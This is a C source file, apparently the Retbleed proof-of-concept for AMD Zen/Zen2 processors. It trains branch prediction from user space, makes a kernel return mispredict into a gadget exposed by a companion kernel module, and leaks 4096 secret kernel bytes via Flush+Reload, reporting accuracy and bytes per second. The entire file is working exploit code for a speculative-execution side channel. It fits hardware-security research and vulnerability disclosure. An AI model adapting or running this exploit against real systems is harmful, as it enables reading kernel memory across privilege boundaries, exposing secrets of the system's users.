#include "common.h"
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include "./kmod_retbleed_poc/retbleed_poc_ioctl.h"
#include <err.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>

static inline unsigned long get_ms() {
	static struct timeval tp;
	gettimeofday(&tp, 0);
	return tp.tv_sec * 1000 + tp.tv_usec / 1000;
}

// Zen/+
/* #define PWN_PATTERN 0xffff800008140000UL */
// Zen2
#define PWN_PATTERN 0xffff802002800000UL


// how many rounds to try mispredict? Many rounds often breaks things. Probably
// there's some usefulness bits that downvotes a bad prediction.
#define ROUNDS 10000

// RB, reload buffer
#define RB_PTR 0x13300000000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x100

#define PG_ROUND(n) (((((n)-1UL)>>12)+1)<<12)

__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

struct mem_info {
    union {
        u64 va;
        u8* buf;
    };
    u64 kva;
    u64 pa;
};

static long va_to_phys(int fd, long va)
{
    unsigned long pa_with_flags;

    lseek(fd, ((long) va)>>9, SEEK_SET);
    read(fd, &pa_with_flags, 8);
    // printf("phys %p\n", (void*)pa_with_flags);
    return pa_with_flags<<12 | (va & 0xfff);
}

// flip to 1 when we SHOULD segfault and not crash the program
static int should_segfault = 0;

static sigjmp_buf env;
static void handle_segv(int sig, siginfo_t *si, void *unused)
{
    if (should_segfault) {
        siglongjmp(env, 12);
        return;
    };

    fprintf(stderr, "Not handling SIGSEGV\n");
    exit(sig);
}


static u8 secret_bytes[0x1000];
static u8 expected_secret_bytes[0x1000];

int main(int argc, char *argv[])
{
    srand(getpid());

    struct mem_info rb;
    struct synth_gadget_desc sgd;
    rb.va = RB_PTR;

    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = &handle_segv;
    sigaction (SIGSEGV, &sa, NULL);

#define MAX(a,b) ((a) > (b)) ? a : b
#define RB_SZ MAX(RB_SLOTS<<RB_STRIDE_BITS, 1UL<<21)

    // reload buffer. We will check for cache hits in rb[SECRET<<RB_STRIDE_BITS]
    //    map_or_die(rb.buf, RB_SZ, PROT_RW, MMAP_FLAGS|MAP_HUGETLB, -1, 0);
    map_or_die(rb.buf, RB_SZ, PROT_RW, MMAP_FLAGS&~MAP_POPULATE, -1, 0);
    madvise(rb.buf, 1UL<<21, MADV_HUGEPAGE);

    // We may need to wait a while for khugepage to finish turning mapping into
    // huge.
    sleep(2);

    rb.buf[123] = 1;

    int fd_retbleed_poc;
    fd_retbleed_poc = open("/proc/" PROC_RETBLEED_POC, O_RDONLY);
    if (fd_retbleed_poc <= 0  ) {
        err(1, "You need to install the kmod_retbleed_poc for this poc\n");
    }

    ioctl(fd_retbleed_poc, REQ_GADGET, &sgd);
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap < 0) {
        perror("fd_pagemap");
        exit(1);
    }
    rb.pa = va_to_phys(fd_pagemap, rb.va);
    if (rb.pa == 0) {
        fprintf(stderr, "Need root to read pagemap\n");
        exit(1);
    }
    if ((rb.pa & 0x1fffff) != 0) {
        fprintf(stderr, "rb is not a thp\n");
        exit(1);
    }
    rb.kva = sgd.physmap_base+rb.pa;
    printf("rb.pa     %lx\n", rb.pa);
    printf("rb.kva    %lx\n", rb.kva);
    printf("kbr_src   %lx\n", sgd.kbr_src);
    printf("kbr_dst   %lx\n", sgd.kbr_dst);
    printf("last_tgt  %lx\n", sgd.last_tgt);

    struct payload p;
    p.reload_buffer = rb.kva;

    // expect RB_ENTRY to be hot on collision. give it any value 0--RB_SLOTS
    p.secret = sgd.secret;

    flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
    u64 ptrn_shl = PWN_PATTERN;
    u64 br_src_training = sgd.last_tgt ^ ptrn_shl;
    u64 br_src_training_sz = sgd.kbr_src - sgd.last_tgt;

    if (mmap((void*)(br_src_training & ~0xfff),
                PG_ROUND(br_src_training_sz), PROT_RWX, MMAP_FLAGS, -1, 0)
            == MAP_FAILED) {
        // not able to map here.. maybe occupied. try some other
        // mutation instead.
        err(1, "mmap");
    }
    memset((u8 *)br_src_training, 0x90, br_src_training_sz);
    *(u8 *)(br_src_training+br_src_training_sz-1) = 0xff;
    *(u8 *)(br_src_training+br_src_training_sz) = 0xe0; // jmp rax

#define NBYTES 0x1000
    int error_start = 0;
    u64 t0 = get_ms();
    for (int i = 0; i < NBYTES; ++i) {
        memset(results, 0, RB_SLOTS*sizeof(results[0]));
        p.secret = sgd.secret + i;
        /* printf("addr=%lx\n", p.secret); */
        // retries
        flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
        for (int u = 0; u < 4; ++u) {
            should_segfault = 1;
            int a = sigsetjmp(env, 1);
            if (a == 0) {
                asm volatile (
                        "jmp *%1" :: "a"(sgd.kbr_dst), "r"(br_src_training));
            }
            should_segfault = 0;
            // go into kernel and run a return instruction. it will to
            // mispredict into kbr_dst for certain patterns.
            ioctl(fd_retbleed_poc, REQ_SPECULATE, &p);
        }
        reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);

        int j;
        for (j = 0 ; j < RB_SLOTS; ++j) {
            if (results[j] >= 1) {
                break;
            }
        }
        if (j < RB_SLOTS) {
            secret_bytes[i] = j;
            /* printf("%c [%02x] (%lu) %d\n", j, j, results[j], 0); */
        } else if (i ==0) {
            printf("nope\n");
        }
    }
    double t = (get_ms() - t0)/1000.0;
    ioctl(fd_retbleed_poc, REQ_SECRET, expected_secret_bytes);
    int errors = 0;
    for (int i = 0; i < NBYTES; ++i) {
        if (expected_secret_bytes[i] != secret_bytes[i]) {
            errors++;
        }
    }

    printf(
            "%d/%d accuracy=%0.4f speed=%0.2f B/s\n", NBYTES-errors, NBYTES, (NBYTES-errors)/(1.0*NBYTES), NBYTES/t);
    return 0;
}
